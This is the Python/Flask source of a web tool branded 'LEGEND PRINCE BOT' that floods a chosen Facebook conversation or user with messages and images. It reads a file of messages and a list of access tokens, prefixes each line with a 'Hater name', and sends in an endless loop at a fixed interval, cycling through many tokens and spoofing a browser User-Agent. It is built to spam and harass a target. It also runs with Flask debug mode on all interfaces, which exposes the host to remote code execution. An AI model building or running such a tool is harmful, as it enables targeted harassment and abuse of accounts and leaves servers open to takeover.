from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
import os
 
app = Flask(__name__)
app.debug = True
 
# Create uploads directory if it doesn't exist
if not os.path.exists('uploads'):
    os.makedirs('uploads')
 
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'application/json',
}
 
stop_events = {}
threads = {}

def send_message_to_facebook(access_token, thread_id, message):
    """Send message to Facebook using Graph API"""
    try:
        # For user-to-user messages
        if thread_id.startswith('t_'):
            api_url = f'https://graph.facebook.com/v22.0/{thread_id}/messages'
        else:
            api_url = f'https://graph.facebook.com/v22.0/me/messages'
            
        data = {
            'access_token': access_token,
            'message': message,
            'recipient': {'id': thread_id} if not thread_id.startswith('t_') else None
        }
        
        # Remove None values
        data = {k: v for k, v in data.items() if v is not None}
        
        response = requests.post(api_url, json=data, headers=headers)
        result = response.json()
        
        if response.status_code == 200:
            return True, "Message sent successfully"
        else:
            return False, f"Error: {result.get('error', {}).get('message', 'Unknown error')}"
            
    except Exception as e:
        return False, f"Exception: {str(e)}"

def send_image_to_facebook(access_token, thread_id, image_path):
    """Send image to Facebook using Graph API"""
    try:
        # Upload image first
        upload_url = f'https://graph.facebook.com/v22.0/me/message_attachments'
        
        with open(image_path, 'rb') as image_file:
            files = {
                'filedata': (os.path.basename(image_path), image_file, 'image/jpeg')
            }
            data = {
                'access_token': access_token,
                'message': '{"attachment_type":"image"}'
            }
            
            upload_response = requests.post(upload_url, files=files, data=data)
            upload_result = upload_response.json()
            
            if upload_response.status_code == 200:
                attachment_id = upload_result.get('attachment_id')
                
                # Now send the attachment
                if thread_id.startswith('t_'):
                    message_url = f'https://graph.facebook.com/v22.0/{thread_id}/messages'
                    message_data = {
                        'access_token': access_token,
                        'attachment_id': attachment_id
                    }
                else:
                    message_url = f'https://graph.facebook.com/v22.0/me/messages'
                    message_data = {
                        'access_token': access_token,
                        'attachment': {'type': 'image', 'payload': {'attachment_id': attachment_id}},
                        'recipient': {'id': thread_id}
                    }
                
                message_response = requests.post(message_url, json=message_data, headers=headers)
                
                if message_response.status_code == 200:
                    return True, "Image sent successfully"
                else:
                    return False, f"Failed to send image: {message_response.text}"
            else:
                return False, f"Failed to upload image: {upload_response.text}"
                
    except Exception as e:
        return False, f"Exception: {str(e)}"

def send_messages(access_tokens, thread_id, mn, time_interval, messages, image_files, task_id):
    stop_event = stop_events[task_id]
    message_count = 0
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            
            # Send message
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                
                # Clean the access token
                access_token = access_token.strip()
                if not access_token:
                    continue
                    
                message = f"{mn} {message1}"
                success, result = send_message_to_facebook(access_token, thread_id, message)
                
                if success:
                    print(f"✓ Message {message_count} Sent Successfully from token")
                else:
                    print(f"✗ Message Failed: {result}")
                
                message_count += 1
                time.sleep(time_interval)
            
            # Send image after each message if image files are provided
            if image_files and not stop_event.is_set():
                for access_token in access_tokens:
                    if stop_event.is_set():
                        break
                    
                    # Clean the access token
                    access_token = access_token.strip()
                    if not access_token:
                        continue
                        
                    # Select random image
                    image_file = random.choice(image_files)
                    image_path = os.path.join('uploads', image_file)
                    
                    if os.path.exists(image_path):
                        success, result = send_image_to_facebook(access_token, thread_id, image_path)
                        if success:
                            print(f"✓ Image Sent Successfully: {image_file}")
                        else:
                            print(f"✗ Image Failed: {result}")
                        
                        time.sleep(time_interval)
 
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        try:
            token_option = request.form.get('tokenOption')
            
            if token_option == 'single':
                single_token = request.form.get('singleToken', '').strip()
                access_tokens = [single_token] if single_token else []
            else:
                token_file = request.files.get('tokenFile')
                if token_file:
                    access_tokens = token_file.read().decode().strip().splitlines()
                else:
                    access_tokens = []

            if not access_tokens:
                return "Error: No valid access tokens provided"

            thread_id = request.form.get('threadId', '').strip()
            if not thread_id:
                return "Error: Thread ID is required"

            mn = request.form.get('kidx', '').strip()
            if not mn:
                return "Error: Hater name is required"

            try:
                time_interval = max(1, int(request.form.get('time', 2)))
            except ValueError:
                time_interval = 2

            txt_file = request.files.get('txtFile')
            if not txt_file:
                return "Error: Message file is required"
            
            messages = txt_file.read().decode().splitlines()
            if not messages:
                return "Error: No messages found in the file"
            
            # Handle image files upload
            image_files = []
            uploaded_images = request.files.getlist('imageFiles')
            for image in uploaded_images:
                if image and image.filename:
                    # Save uploaded image
                    filename = f"{int(time.time())}_{random.randint(1000,9999)}_{image.filename}"
                    filepath = os.path.join('uploads', filename)
                    image.save(filepath)
                    image_files.append(filename)

            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

            stop_events[task_id] = Event()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, image_files, task_id))
            threads[task_id] = thread
            thread.start()

            return f'Task started with ID: {task_id}<br>Tokens: {len(access_tokens)}<br>Messages: {len(messages)}<br>Images: {len(image_files)}<br>Interval: {time_interval}s'

        except Exception as e:
            return f"Error: {str(e)}"

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🥀🥀𝐓𝐇𝐄 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄 𝐇𝐄𝐑𝐄🥀🥀</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    body {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      min-height: 100vh;
    }
    .container {
      max-width: 400px;
      background: rgba(0, 0, 0, 0.7);
      border-radius: 15px;
      padding: 25px;
      margin-top: 20px;
      margin-bottom: 20px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
    }
    .form-control {
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 255, 255, 0.3);
      color: white;
      border-radius: 10px;
    }
    .form-control::placeholder {
      color: rgba(255, 255, 255, 0.7);
    }
    .form-control:focus {
      background: rgba(255, 255, 255, 0.2);
      border-color: #fff;
      color: white;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
    }
    .btn-primary {
      background: linear-gradient(45deg, #FF416C, #FF4B2B);
      border: none;
      border-radius: 10px;
      font-weight: bold;
    }
    .btn-danger {
      background: linear-gradient(45deg, #FF0000, #8B0000);
      border: none;
      border-radius: 10px;
      font-weight: bold;
    }
    .header {
      text-align: center;
      margin-bottom: 30px;
    }
    .info-text {
      font-size: 12px;
      color: #ccc;
      margin-top: -10px;
      margin-bottom: 15px;
    }
    .image-preview {
      max-width: 80px;
      max-height: 80px;
      margin: 5px;
      border-radius: 8px;
      border: 2px solid white;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      color: rgba(255, 255, 255, 0.8);
    }
    .whatsapp-link {
      color: #25d366;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h3>🥀 LEGEND PRINCE BOT 🥀</h3>
      <p class="mb-0">Facebook Message Sender</p>
    </div>
    
    <form method="post" enctype="multipart/form-data">
      <!-- Token Option -->
      <div class="mb-3">
        <label class="form-label">Token Type</label>
        <select class="form-control" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Multiple Tokens</option>
        </select>
      </div>

      <!-- Single Token -->
      <div class="mb-3" id="singleTokenInput">
        <label class="form-label">Facebook Token</label>
        <input type="text" class="form-control" name="singleToken" placeholder="EAAB...">
        <div class="info-text">Enter your Facebook access token</div>
      </div>

      <!-- Token File -->
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label class="form-label">Token File</label>
        <input type="file" class="form-control" name="tokenFile" accept=".txt">
        <div class="info-text">Upload .txt file with tokens (one per line)</div>
      </div>

      <!-- Thread ID -->
      <div class="mb-3">
        <label class="form-label">Conversation ID</label>
        <input type="text" class="form-control" name="threadId" required placeholder="t_1000... or user_id">
        <div class="info-text">Enter conversation ID (t_xxx) or user ID</div>
      </div>

      <!-- Hater Name -->
      <div class="mb-3">
        <label class="form-label">Your Name</label>
        <input type="text" class="form-control" name="kidx" required placeholder="Legend Prince">
      </div>

      <!-- Time Interval -->
      <div class="mb-3">
        <label class="form-label">Delay (seconds)</label>
        <input type="number" class="form-control" name="time" value="2" min="1" required>
        <div class="info-text">Delay between messages</div>
      </div>

      <!-- Messages File -->
      <div class="mb-3">
        <label class="form-label">Messages File</label>
        <input type="file" class="form-control" name="txtFile" accept=".txt" required>
        <div class="info-text">Upload .txt file with messages (one per line)</div>
      </div>

      <!-- Images -->
      <div class="mb-3">
        <label class="form-label">Images (Optional)</label>
        <input type="file" class="form-control" name="imageFiles" multiple accept="image/*">
        <div class="info-text">Select images for message+image cycle</div>
        <div id="imagePreview" class="mt-2"></div>
      </div>

      <button type="submit" class="btn btn-primary w-100 py-2">🚀 Start Sending</button>
    </form>

    <!-- Stop Form -->
    <form method="post" action="/stop" class="mt-4">
      <div class="mb-3">
        <label class="form-label">Stop Task</label>
        <input type="text" class="form-control" name="taskId" required placeholder="Enter Task ID">
      </div>
      <button type="submit" class="btn btn-danger w-100 py-2">🛑 Stop Task</button>
    </form>
  </div>

  <div class="footer">
    <p>© 2025 Developed by LEGEND PRINCE</p>
    <p>
      <a href="https://www.facebook.com/100064267823693" class="whatsapp-link">
        <i class="fab fa-facebook"></i> Facebook
      </a> | 
      <a href="https://wa.me/+917543864229" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> WhatsApp
      </a>
    </p>
  </div>

  <script>
    function toggleTokenInput() {
      const tokenOption = document.querySelector('[name="tokenOption"]').value;
      document.getElementById('singleTokenInput').style.display = 
        tokenOption === 'single' ? 'block' : 'none';
      document.getElementById('tokenFileInput').style.display = 
        tokenOption === 'multiple' ? 'block' : 'none';
    }

    // Image preview
    document.querySelector('[name="imageFiles"]').addEventListener('change', function(e) {
      const preview = document.getElementById('imagePreview');
      preview.innerHTML = '';
      
      Array.from(e.target.files).forEach(file => {
        if (file.type.startsWith('image/')) {
          const reader = new FileReader();
          reader.onload = function(e) {
            const img = document.createElement('img');
            img.src = e.target.result;
            img.className = 'image-preview';
            preview.appendChild(img);
          }
          reader.readAsDataURL(file);
        }
      });
    });

    // Initialize
    document.addEventListener('DOMContentLoaded', toggleTokenInput);
  </script>
</body>
</html>
''')
 
@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId', '').strip()
    if task_id in stop_events:
        stop_events[task_id].set()
        thread = threads.get(task_id)
        if thread:
            thread.join(timeout=5)
        del stop_events[task_id]
        del threads[task_id]
        return f'✅ Task {task_id} stopped successfully'
    else:
        return f'❌ Task {task_id} not found'
 
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
